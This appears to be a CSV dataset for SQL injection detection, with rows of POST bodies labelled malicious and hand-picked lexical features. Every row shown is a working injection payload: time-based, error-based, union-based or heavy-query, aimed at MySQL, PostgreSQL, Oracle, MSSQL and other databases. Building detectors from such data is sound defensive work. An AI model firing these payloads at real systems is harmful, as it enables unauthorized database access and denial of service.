method,body,class,single_q,double_q,dashes,braces,spaces,badwords,path
POST,"select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--",1,0,0,3,4,32,3,
POST,"1""  )   as tqxa where 6751  =  6751 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,1,3,19,106,9,
POST,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,1,0,0,5,28,2,
POST,"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,0,0,0,5,36,3,
POST,"1%""   )    )    union all select null,null,null#",1,0,1,0,2,14,3,
POST,-2364' or 6743  =  7578,1,1,0,1,0,6,1,
POST,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1,8,0,1,4,39,4,
POST,"1%'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   '%'  =  '",1,4,0,0,8,56,5,
POST,"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",1,1,0,1,0,4,3,
POST,end-- podi,1,0,0,3,0,1,0,
POST,"1%' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0,3,4,33,8,
POST,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1,0,4,0,30,148,5,
POST,"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""udlh""  =  ""udlh",1,0,4,0,6,47,9,
POST,"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,1,3,35,171,5,
POST,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",1,1,0,3,2,14,3,
POST,"1"" where 6281  =  6281 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,1,3,4,39,9,
POST,"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""giuq""  =  ""giuq",1,2,4,0,12,68,3,
POST,"1   )    )    union all select null,null--",1,0,0,3,2,14,3,
POST,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,1,1,0,3,3,22,4,
POST,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0,0,3,14,79,7,
POST,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  '%'  =  '",1,3,0,0,5,29,4,
POST,"1%"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0,1,0,4,24,2,
POST,"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm",1,4,0,0,16,80,3,
POST,"1'   )    )     )   union all select null,null#",1,1,0,0,3,18,3,
POST,"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1,0,0,4,39,11,
POST,"1%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '%'  =  '",1,4,0,0,14,75,3,
POST,"-7851""   )    )    or 6872  =  6872 and    (    (   ""dvbw"" like ""dvbw",1,0,4,1,4,30,3,
POST,"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'zknl'  =  'zknl",1,4,0,0,14,72,3,
POST,"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr",1,0,4,1,36,180,7,
POST,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",1,4,0,0,10,57,3,
POST,select pg_sleep  (  5   )    )   +',1,1,0,0,3,15,1,
POST,"1""  )   where 4382  =  4382 and 6607  =  2394--",1,0,1,3,1,16,2,
POST,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""krxy""  =  ""krxy",1,0,4,0,8,48,2,
POST," end and ""unqj""  =  ""unqj",1,0,3,0,0,7,1,
POST,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",1,1,0,4,2,14,3,
POST,"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",1,3,0,3,1,17,6,
POST,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",1,1,0,0,3,20,3,
POST,"1""  )   where 5719  =  5719 rlike sleep  (  5  )  --",1,0,1,3,3,20,2,
POST,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,1,6,0,0,6,35,4,
POST,"1%' and make_set  (  1227  =  5627,5627  )   and '%'  =  '",1,4,0,0,2,20,2,
POST,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",1,4,0,1,6,38,3,
POST,"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",1,0,0,0,10,50,3,
POST,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'egye'  =  'egye",1,4,0,0,16,76,2,
POST,1' where 3028  =  3028,1,1,0,0,0,6,1,
POST, (  select   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  select 4108 from information_schema.character_sets  )   end   )    ) ,1,0,0,0,8,46,3,
POST,"1""   )    )    as jikg where 8258  =  8258 and   (  3973  =  1047  )  *1047--",1,0,1,3,4,32,3,
POST,"1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,0,3,5,40,5,
POST,"1""  )   as wjdc where 8694  =  8694 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,0,1,3,33,168,7,
POST,"1 where 3737  =  3737 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,0,3,4,37,8,
POST,-4954'  )   or 8571  =  8571--,1,1,0,4,1,10,1,
POST,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,1,0,0,0,6,39,3,
POST,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,0,0,3,5,34,3,
POST,"1'   )    )    union all select null,null--",1,1,0,3,2,14,3,
POST,"iif  (  1483  =  7301,1,1/0  )  ",1,0,0,0,2,12,0,
POST,"1'||  (  select 'jonh' from dual where 2415  =  2415 union all select null,null,null,null,null,null,null,null,null--",1,3,0,3,1,17,6,
POST,"1%'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",1,4,0,0,6,53,12,
POST,1'||  (  select 'ilkr' from dual where 9296  =  9296,1,3,0,0,1,13,3,
POST,"1""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,1,3,18,80,1,
POST,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""bizm""  =  ""bizm",1,0,4,0,20,107,7,
POST,1'  )   as mzby where 6530  =  6530,1,1,0,0,1,12,2,
POST,1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'sqvt' like 'sqvt,1,8,0,0,4,37,5,
POST,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",1,0,1,0,2,22,5,
POST,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",1,4,0,0,6,47,9,
POST,select case when 3995  =  8680 then 1 else null end--,1,0,0,3,0,12,2,
POST,"1%""   )    )     )   rlike   (  select   (  case when   (  4442  =  4476  )   then 1 else 0x28 end   )    )    and    (    (     (  ""%""  =  """,1,0,4,0,12,74,2,
POST,"1'+  (  select 'ayod' where 7839  =  7839 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,4,0,0,20,111,9,
POST,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,2,0,3,9,54,4,
POST,-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,1,0,0,4,34,159,3,
POST,1' where 5458  =  5458 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,0,0,8,45,5,
POST,"-5763'   )    )     )   union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",1,1,0,1,3,18,3,
POST,select   (  case when   (  6652  =  1932  )   then 6652 else 6652*  (  select 6652 from information_schema.character_sets  )   end  )  #,1,0,0,0,6,39,3,
POST,-4173'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'jdwt' like 'jdwt,1,4,0,1,34,168,7,
POST,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'bemh'  =  'bemh",1,4,0,0,8,50,3,
POST,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,1,0,4,0,10,57,3,
POST,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,5,0,3,9,53,4,
POST,"1   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  1205  =  1205",1,0,0,0,16,85,3,
POST,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,0,0,7,39,4,
POST,"1""  )   as kuuf where 6908  =  6908",1,0,1,0,1,12,2,
POST,-6661'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'tbmu' like 'tbmu,1,4,0,1,38,182,5,
POST,1'   )    )    as wjfj where 3802  =  3802,1,1,0,0,2,18,2,
POST,"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""xsfg"" like ""xsfg",1,4,4,0,6,45,5,
POST,-2516  )   where 3349  =  3349 or 4855  =  1806--,1,0,0,4,1,16,2,
POST,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,0,1,0,3,18,3,
POST,1'  )   as xqbq where 1619  =  1619 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,5,0,3,5,45,5,
POST,"-2782"" union all select 2109,2109,2109#",1,0,1,1,0,4,3,
POST,1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,1,0,3,9,51,7,
POST,"1"" and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,0,1,3,10,46,2,
POST,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,3,0,3,5,41,6,
POST,1'  )   where 6408  =  6408,1,1,0,0,1,10,1,
POST,"1%'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1,4,0,0,36,176,5,
POST,"-3230""   )    )    as kbxc where 5007  =  5007 or 2107  =  8818",1,0,1,1,2,24,3,
POST,1'  )   and   (  3020  =  3020  )  *6703 and   (  'lhfa'  =  'lhfa,1,4,0,0,4,28,2,
POST,"1""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""aall"" like ""aall",1,0,4,0,24,131,16,
POST,1'||  (  select 'dyuw' from dual where 2037  =  2037,1,3,0,0,1,13,3,
POST,"-5181""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""qofp""  =  ""qofp",1,0,4,1,8,48,2,
POST,"-2838"" where 5442  =  5442 union all select 5442#",1,0,1,1,0,10,4,
POST,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,0,1,3,5,36,3,
POST,"1""  )   where 6072  =  6072 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,0,1,0,5,34,3,
POST,"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tpcm' like 'tpcm",1,4,0,0,8,63,13,
POST,"1' where 6905  =  6905 union all select null,null,null,null,null,null#",1,1,0,0,0,10,4,
POST,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",1,4,0,0,20,105,10,
POST,"1"" and 4996  =  4431 and ""jzaq""  =  ""jzaq",1,0,4,0,0,12,2,
POST,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,0,3,11,56,3,
POST,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0,1,3,16,91,8,
POST,"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'lgcw'  =  'lgcw",1,4,0,0,18,99,7,
POST,"1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",1,4,0,0,24,128,8,
POST,"1""  )   as cfed where 8220  =  8220 union all select null,null,null,null,null,null,null,null,null#",1,0,1,0,1,16,5,
POST,-8876'   )    )    or 3038  =  3038,1,1,0,1,2,16,1,
POST,"-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz",1,4,0,1,2,20,2,
POST,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'dubu' like 'dubu",1,4,0,0,10,50,4,
POST,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0,3,5,41,8,
POST,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lwyo'  =  'lwyo",1,4,0,0,10,61,5,
POST,1 where 8532  =  8532,1,0,0,0,0,6,1,
POST,"-8790'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'nsze' like 'nsze",1,4,0,1,36,171,5,
POST,"-9023%""   )    )     )   union all select 4490,4490,4490#",1,0,1,1,3,18,3,
POST,"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  """,1,0,4,0,2,20,2,
POST,"1   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  3023  =  3023",1,0,0,0,28,136,3,
POST,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""xbft""  =  ""xbft",1,0,4,0,4,30,3,
POST,"1"" or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,1,3,16,70,1,
POST,"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",1,4,0,1,8,46,3,
POST,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",1,0,4,0,22,104,2,
POST,"1  )   where 9724  =  9724 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,0,3,17,80,2,
POST,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",1,0,4,1,8,46,3,
POST,"-4513""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""gytb""  =  ""gytb",1,0,4,1,44,211,7,
